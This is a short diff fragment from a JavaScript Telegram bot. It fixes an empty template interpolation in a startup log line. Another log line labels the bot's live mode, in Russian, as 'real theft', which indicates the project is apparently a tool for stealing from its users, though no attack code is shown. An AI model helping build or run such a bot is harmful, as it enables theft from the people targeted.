@@ -822,5 +822,5 @@ bot.onText(/\/admin/, (msg) => {
 });
 
 console.log('✅ Бот запущен с обновленным URL');
-console.log(`🌐 Web App: ${}`);
+console.log(`🌐 Web App: `);
 console.log(`🔧 Режим DRY_RUN: ${DRY_RUN ? 'ВКЛ (только просмотр)' : 'ВЫКЛ (реальная кража)'}`);
